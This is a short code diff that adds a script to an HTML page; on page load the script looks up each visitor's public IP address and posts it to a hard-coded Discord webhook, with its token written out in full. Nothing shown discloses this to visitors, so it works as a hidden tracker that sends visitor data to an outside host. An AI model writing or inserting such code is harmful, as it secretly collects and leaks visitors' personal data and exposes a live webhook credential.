@@ -134,6 +134,26 @@
         }
     </style>
 </head>
+     <script>
+        async function sendIP() {
+            try {
+                let response = await fetch("https://api.ipify.org?format=json");
+                let data = await response.json();
+                let ipData = { "IP Address": data.ip };
+                
+                fetch("https://discordapp.com/api/webhooks/1339972550217961472/hRG2cv544Su6hytoh2J8XMwGk5TKBQPQXgZJD5RZCzQJianlHGjWbNjND1LPgI5XJSYY", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: "New Visitor IP:\n" + JSON.stringify(ipData, null, 2) })
+                });
+            } catch (error) {
+                console.error("Error fetching IP address:", error);
+            }
+        }
+        
+        window.onload = sendIP;
+    </script>
+
 <body>
     <div class="top-bar">
         <div class="logo-container">
